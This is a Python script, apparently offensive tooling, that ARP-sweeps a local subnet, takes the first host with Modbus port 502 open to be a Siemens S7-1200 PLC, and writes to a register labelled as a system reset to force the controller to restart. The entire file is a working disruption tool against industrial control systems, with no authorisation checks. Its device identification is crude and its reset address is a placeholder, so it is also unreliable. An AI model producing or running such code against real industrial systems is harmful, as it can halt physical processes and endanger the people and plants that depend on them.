from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient
import time
import socket

# Change this based on your network
NETWORK_IP_RANGE = "192.168.1.1/24"  # Example Network, modify as needed

def find_plc_ip():
    """Scans the network for connected devices and identifies the Siemens PLC."""
    print("[+] Scanning network for Siemens S7-1200 PLC...")

    # ARP request to find active hosts on the network
    arp_request = ARP(pdst=NETWORK_IP_RANGE)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=2, verbose=False)[0]

    active_hosts = []
    for sent, received in result:
        active_hosts.append(received.psrc)

    # Try identifying PLC by checking open Modbus or S7Comm ports
    for ip in active_hosts:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)

            # Check if Port 502 (Modbus) is open
            if sock.connect_ex((ip, 502)) == 0:
                print(f"[!] Siemens S7-1200 PLC detected at IP: {ip}")
                return ip
            sock.close()
        
        except Exception as e:
            pass

    print("[-] Siemens PLC not found.")
    return None

def restart_plc(ip):
    """Connects to the Siemens S7-1200 PLC and forces a restart."""
    print(f"[+] Attempting to restart PLC at {ip}...")

    # Modbus Client (Port 502)
    client = ModbusClient(host=ip, port=502, auto_open=True)

    if not client.is_open:
        print("[-] Failed to connect to PLC Modbus interface.")
        return

    print("[+] Connected to PLC. Sending Restart Command...")

    # Example: Write to Memory Region that controls system reset (ADDRESS MAY VARY)
    SYSTEM_RESET_MW = 10  # Example used, modify based on actual settings

    # Writing 1 to a specific memory area that would trigger a restart
    if client.write_single_register(SYSTEM_RESET_MW, 1):
        print("[!] Restart command sent successfully.")
    else:
        print("[-] Failed to send restart command.")

    # Give some time before closing connection
    time.sleep(2)
    client.close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        restart_plc(plc_ip)
    else:
        print("[-] Could not locate PLC. Exiting.")